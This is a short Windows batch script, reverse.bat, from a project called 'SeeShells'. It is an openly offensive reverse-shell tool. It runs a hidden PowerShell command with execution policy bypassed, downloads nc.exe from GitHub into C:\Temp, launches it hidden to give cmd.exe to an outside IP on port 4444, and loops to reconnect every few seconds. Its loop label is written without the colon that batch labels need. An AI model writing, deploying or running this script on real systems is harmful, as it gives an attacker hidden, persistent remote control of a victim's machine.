#*******************************************************
#*  Project Name  : SeeShells
#*  File Name     : reverse.bat
#*  Author        : Damien Keffyn
#*  Company       : Sentinal IT
#*  Date Created  : 27/09/2024
#*******************************************************/

@echo off
REM Infinite loop to reconnect if the shell times out:
RECONNECT
tasklist /FI "IMAGENAME eq nc.exe" | find /I "nc.exe" >nul
if not errorlevel 1 (
    echo nc.exe is running. Terminating the process...
    taskkill /F /IM nc.exe
    echo nc.exe has been terminated.
) else (
    echo nc.exe is not running.
)


powershell -w hidden -NoP -NonI -Exec Bypass -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/int0x33/nc.exe/raw/master/nc.exe','C:\Temp\nc.exe');Start-Process 'C:\Temp\nc.exe' -ArgumentList '193.114.96.29 4444 -e cmd.exe' -WindowStyle Hidden"

REM Wait for a few seconds before retrying
timeout /T 5 /NOBREAK

REM Go back to the reconnect label to retry
goto RECONNECT